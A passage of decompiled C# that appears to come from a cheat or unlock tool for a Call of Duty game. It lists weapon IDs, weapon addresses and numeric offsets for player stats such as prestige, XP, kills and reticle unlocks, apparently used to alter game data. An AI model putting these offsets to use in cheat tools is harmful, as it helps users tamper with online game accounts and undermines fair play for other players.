		public static string WeaponKSP45 = "20";

		// Token: 0x040001D0 RID: 464
		public static string WeaponKSP45PAP = "377";

		// Token: 0x040001D1 RID: 465
		public static string WeaponBullfrog = "16";

		// Token: 0x040001D2 RID: 466
		public static string WeaponBullfrogPAP = "317";

		// Token: 0x040001D3 RID: 467
		public static string WeaponMac10 = "49";

		// Token: 0x040001D4 RID: 468
		public static string WeaponMac10PAP = "388";

		// Token: 0x040001D5 RID: 469
		public static string WeaponType63 = "38";

		// Token: 0x040001D6 RID: 470
		public static string WeaponType63PAP = "362";

		// Token: 0x040001D7 RID: 471
		public static string WeaponM16 = "41";

		// Token: 0x040001D8 RID: 472
		public static string WeaponM16PAP = "383";

		// Token: 0x040001D9 RID: 473
		public static string WeaponAUG = "40";

		// Token: 0x040001DA RID: 474
		public static string WeaponAUGPAP = "255";

		// Token: 0x040001DB RID: 475
		public static string WeaponDMR14 = "37";

		// Token: 0x040001DC RID: 476
		public static string WeaponDMR14PAP = "283";

		// Token: 0x040001DD RID: 477
		public static string WeaponStoner63 = "3";

		// Token: 0x040001DE RID: 478
		public static string WeaponStoner63PAP = "335";

		// Token: 0x040001DF RID: 479
		public static string WeaponRPD = "50";

		// Token: 0x040001E0 RID: 480
		public static string WeaponRPDPAP = "379";

		// Token: 0x040001E1 RID: 481
		public static string WeaponM60 = "65";

		// Token: 0x040001E2 RID: 482
		public static string WeaponM60PAP = "299";

		// Token: 0x040001E3 RID: 483
		public static string WeaponPelington703 = "34";

		// Token: 0x040001E4 RID: 484
		public static string WeaponPelington703PAP = "324";

		// Token: 0x040001E5 RID: 485
		public static string WeaponLW3Tundra = "51";

		// Token: 0x040001E6 RID: 486
		public static string WeaponLW3TundraPAP = "274";

		// Token: 0x040001E7 RID: 487
		public static string WeaponM82 = "5";

		// Token: 0x040001E8 RID: 488
		public static string WeaponM82PAP = "297";

		// Token: 0x040001E9 RID: 489
		public static string Weapon1911 = "18";

		// Token: 0x040001EA RID: 490
		public static string Weapon1911PAP = "280";

		// Token: 0x040001EB RID: 491
		public static string WeaponMagnum = "22";

		// Token: 0x040001EC RID: 492
		public static string WeaponMagnumPAP = "273";

		// Token: 0x040001ED RID: 493
		public static string WeaponDiamatti = "30";

		// Token: 0x040001EE RID: 494
		public static string WeaponDiamattiPAP = "402";

		// Token: 0x040001EF RID: 495
		public static string WeaponHauer77 = "39";

		// Token: 0x040001F0 RID: 496
		public static string WeaponHauer77PAP = "381";

		// Token: 0x040001F1 RID: 497
		public static string WeaponGalloSA12 = "56";

		// Token: 0x040001F2 RID: 498
		public static string WeaponGalloSA12PAP = "401";

		// Token: 0x040001F3 RID: 499
		public static string WeaponStreetSweeper = "64";

		// Token: 0x040001F4 RID: 500
		public static string WeaponStreetSweeperPAP = "247";

		// Token: 0x040001F5 RID: 501
		public static string WeaponCigma2 = "24";

		// Token: 0x040001F6 RID: 502
		public static string WeaponCigma2PAP = "323";

		// Token: 0x040001F7 RID: 503
		public static string WeaponRPG7 = "12";

		// Token: 0x040001F8 RID: 504
		public static string WeaponRPG7PAP = "292";

		// Token: 0x040001F9 RID: 505
		public static string WeaponKnife = "14";

		// Token: 0x040001FA RID: 506
		public static string WeaponKnifePAP = "396";

		// Token: 0x040001FB RID: 507
		public static string WeaponSledgeHammer = "29";

		// Token: 0x040001FC RID: 508
		public static string WeaponSledgeHammerPAP = "354";

		// Token: 0x040001FD RID: 509
		public static string WeaponWakizashi = "33";

		// Token: 0x040001FE RID: 510
		public static string WeaponWakizashiPAP = "316";

		// Token: 0x040001FF RID: 511
		public static string WeaponM79 = "10";

		// Token: 0x04000200 RID: 512
		public static string WeaponM79PAP = "369";

		// Token: 0x04000201 RID: 513
		public static string WeaponFARA83 = "35";

		// Token: 0x04000202 RID: 514
		public static string WeaponFARA83PAP = "340";

		// Token: 0x04000203 RID: 515
		public static string WeaponLC10 = "46";

		// Token: 0x04000204 RID: 516
		public static string WeaponLC10PAP = "271";

		// Token: 0x04000205 RID: 517
		public static string WeaponR1ShadowhunterCrossbow = "11";

		// Token: 0x04000206 RID: 518
		public static string WeaponR1ShadowhunterCrossbowPAP = "368";

		// Token: 0x04000207 RID: 519
		public static string WeaponMachete = "11";

		// Token: 0x04000208 RID: 520
		public static string WeaponMachetePAP = "368";

		// Token: 0x04000209 RID: 521
		public static string WeaponBallisticKnife = "26";

		// Token: 0x0400020A RID: 522
		public static string WeaponBallisticKnifPAP = "313";

		// Token: 0x0400020B RID: 523
		public static string WeaponPPSh41 = "52";

		// Token: 0x0400020C RID: 524
		public static string WeaponPPSh41PAP = "286";

		// Token: 0x0400020D RID: 525
		public static string WeaponZRGmm = "55";

		// Token: 0x0400020E RID: 526
		public static string WeaponZRGmmEPAP = "270";

		// Token: 0x0400020F RID: 527
		public static string WeaponSwissK31 = "31";

		// Token: 0x04000210 RID: 528
		public static string WeaponSwissK31PAP = "349";

		// Token: 0x04000211 RID: 529
		public static string WeaponCARV2 = "2";

		// Token: 0x04000212 RID: 530
		public static string WeaponCARV2PAP = "293";

		// Token: 0x04000213 RID: 531
		public static string WeaponETool = "4";

		// Token: 0x04000214 RID: 532
		public static string WeaponETool2PAP = "371";

		// Token: 0x04000215 RID: 533
		public static long[] skip = new long[50];

		// Token: 0x04000216 RID: 534
		private int camo;

		// Token: 0x04000217 RID: 535
		private Color theme;

		// Token: 0x04000218 RID: 536
		private int times;

		// Token: 0x04000219 RID: 537
		private int timesp2;

		// Token: 0x0400021A RID: 538
		private int timesp3;

		// Token: 0x0400021B RID: 539
		private int timesp4;

		// Token: 0x0400021C RID: 540
		public long reticle1 = 68754L;

		// Token: 0x0400021D RID: 541
		public long reticle2 = 74130L;

		// Token: 0x0400021E RID: 542
		public long reticle3 = 68882L;

		// Token: 0x0400021F RID: 543
		public long reticle4 = 73106L;

		// Token: 0x04000220 RID: 544
		public long reticle5 = 68242L;

		// Token: 0x04000221 RID: 545
		public long reticle6 = 71442L;

		// Token: 0x04000222 RID: 546
		public long reticle7 = 72978L;

		// Token: 0x04000223 RID: 547
		public long reticle8 = 68626L;

		// Token: 0x04000224 RID: 548
		public long reticle9 = 68114L;

		// Token: 0x04000225 RID: 549
		public long reticle10 = 73362L;

		// Token: 0x04000226 RID: 550
		public long reticle11 = 68498L;

		// Token: 0x04000227 RID: 551
		public long clientSize = 70280L;

		// Token: 0x04000228 RID: 552
		private Dictionary<string, long> Field32 = new Dictionary<string, long>
		{
			{
				"XM4",
				1125099L
			},
			{
				"AK47",
				1124277L
			},
			{
				"KRIG 6",
				1124140L
			},
			{
				"QBZ",
				1124688L
			},
			{
				"FFAR",
				1124414L
			},
			{
				"Groza",
				1124560L
			},
			{
				"FARA 83",
				1124962L
			},
			{
				"MP5",
				1141950L
			},
			{
				"MILANO",
				1141539L
			},
			{
				"BULLFROG",
				1141128L
			},
			{
				"AK74U",
				1141676L
			},
			{
				"KSP45",
				1140991L
			},
			{
				"Mac 10",
				1141402L
			},
			{
				"LC10",
				1140854L
			},
			{
				"TYPE 63",
				1144279L
			},
			{
				"M16",
				1144553L
			},
			{
				"DMR",
				1144827L
			},
			{
				"AUG",
				1144690L
			},
			{
				"STONER",
				1136059L
			},
			{
				"M60",
				1136470L
			},
			{
				"RPD",
				1136333L
			},
			{
				"ZRG 20mm",
				1142224L
			},
			{
				"PELLINGTON",
				1142498L
			},
			{
				"TUNDRA",
				1142635L
			},
			{
				"M82",
				1142361L
			},
			{
				"DIAMATTI",
				1137977L
			},
			{
				"1911",
				1138388L
			},
			{
				"MAGNUM",
				1138251L
			},
			{
				"HAUER",
				1140306L
			},
			{
				"GALLO",
				1140443L
			},
			{
				"Striker",
				1140169L
			},
			{
				"Cigma",
				1135922L
			},
			{
				"RPG",
				1135785L
			},
			{
				"M79",
				1143046L
			},
			{
				"Default Knife",
				1135648L
			},
			{
				"Machette",
				1136881L
			},
			{
				"Sledge hammer",
				1137018L
			},
			{
				"Ace of Spades",
				1136744L
			},
			{
				"Yamikirimaru",
				1137155L
			},
			{
				"Crossbow",
				1142909L
			},
			{
				"Ballistic Knife",
				1142772L
			},
			{
				"Swiss K31",
				1142087L
			},
			{
				"CARV.2",
				1144416L
			},
			{
				"PPSh-41",
				1141813L
			}
		};

		// Token: 0x02000035 RID: 53
		public class preGameStats
		{
			// Token: 0x04000347 RID: 839
			public static uint GlobalStats_Size = 13848U;

			// Token: 0x04000348 RID: 840
			public static uint GlobalStats_Prestige = 1434U;

			// Token: 0x04000349 RID: 841
			public static uint GlobalStats_Prestige2 = 1438U;

			// Token: 0x0400034A RID: 842
			public static uint GlobalStats_Prestige3 = 1494U;

			// Token: 0x0400034B RID: 843
			public static uint GlobalStats_Exp = 1114U;

			// Token: 0x0400034C RID: 844
			public static uint GlobalStats_Exp2 = 1498U;
		}

		// Token: 0x02000036 RID: 54
		public class StatsDDL_Stats
		{
			// Token: 0x0400034D RID: 845
			public static uint TotalRounds = 105216U;

			// Token: 0x0400034E RID: 846
			public static uint Kills1 = 114673U;

			// Token: 0x0400034F RID: 847
			public static uint Kills2 = 114795U;

			// Token: 0x04000350 RID: 848
			public static uint Kills3 = 114798U;

			// Token: 0x04000351 RID: 849
			public static uint KillsElites = 115106U;

			// Token: 0x04000352 RID: 850
			public static uint KillsElites2 = 115106U;

			// Token: 0x04000353 RID: 851
			public static uint KillsCritiq = 115792U;

			// Token: 0x04000354 RID: 852
			public static uint KillsCritiq2 = 115792U;

			// Token: 0x04000355 RID: 853
			public static uint MaxElimInGame = 103345U;

			// Token: 0x04000356 RID: 854
			public static uint GamesPlayed = 98061U;

			// Token: 0x04000357 RID: 855
			public static uint TimePlayed = 114815U;

			// Token: 0x04000358 RID: 856
			public static uint XP1 = 120690U;

			// Token: 0x04000359 RID: 857
			public static uint XP2 = 121074U;

			// Token: 0x0400035A RID: 858
			public static uint Crystals1Part1 = 33435U;

			// Token: 0x0400035B RID: 859
			public static uint Crystals1Part2 = 33439U;

			// Token: 0x0400035C RID: 860
			public static uint Crystals1Part3 = 33443U;

			// Token: 0x0400035D RID: 861
			public static uint MillStopReticlesUnlock = 8827U;

			// Token: 0x0400035E RID: 862
			public static uint Visiontech2xReticlesUnlock = 3073U;

			// Token: 0x0400035F RID: 863
			public static uint KobraRedDotReticlesUnlock = 8690U;

			// Token: 0x04000360 RID: 864
			public static uint QuickdotLEDReticlesUnlock = 4169U;

			// Token: 0x04000361 RID: 865
			public static uint AxialArmsReticlesUnlock = 9375U;

			// Token: 0x04000362 RID: 866
			public static uint SillixHoloscoutReticlesUnlock = 5950U;

			// Token: 0x04000363 RID: 867
			public static uint MicroflexLEDReticlesUnlock = 4306U;

			// Token: 0x04000364 RID: 868
			public static uint HawksmoorReticlesUnlock = 8964U;

			// Token: 0x04000365 RID: 869
			public static uint RoyalKrossReticlesUnlock = 9512U;

			// Token: 0x04000366 RID: 870
			public static uint SusatMultizoomReticlesUnlock = 3895U;

			// Token: 0x04000367 RID: 871
			public static uint DiamondbackReflexReticlesUnlock = 9101U;

			// Token: 0x04000368 RID: 872
			public static uint SnappointReticlesUnlock = 4443U;

			// Token: 0x04000369 RID: 873
			public static uint FastpointReflexReticlesUnlock = 9238U;

			// Token: 0x0400036A RID: 874
			public static uint AxialArm3xReticlesUnlock = 9377U;

			// Token: 0x0400036B RID: 875
			public static uint IronSightsReticlesUnlock = 4171U;

			// Token: 0x0400036C RID: 876
			public static uint OteroMiniReflexReticlesUnlock = 8829U;

			// Token: 0x0400036D RID: 877
			public static uint Prestige1 = 121010U;

			// Token: 0x0400036E RID: 878
			public static uint Prestige2 = 121014U;

			// Token: 0x0400036F RID: 879
			public static uint Prestige3 = 121070U;
		}
	}
}
